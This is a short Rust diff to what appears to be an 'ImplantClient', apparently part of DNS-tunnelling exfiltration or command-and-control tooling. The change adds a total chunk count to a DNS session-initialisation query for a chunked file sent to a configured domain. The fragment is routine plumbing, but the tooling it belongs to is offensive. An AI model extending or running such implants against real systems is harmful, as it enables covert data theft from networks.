@@ -228,7 +228,8 @@ impl ImplantClient {
         chunked: &ChunkedFile,
     ) -> Result<()> {
         let file_hash = chunked.file_hash.to_hex();
-        let query = DnsQuery::session_init(session_id, &file_hash, &self.config.domain);
+        let total_chunks = chunked.total_chunks();
+        let query = DnsQuery::session_init(session_id, &file_hash, total_chunks, &self.config.domain);
 
         let response = client.send(&query).await?;
 
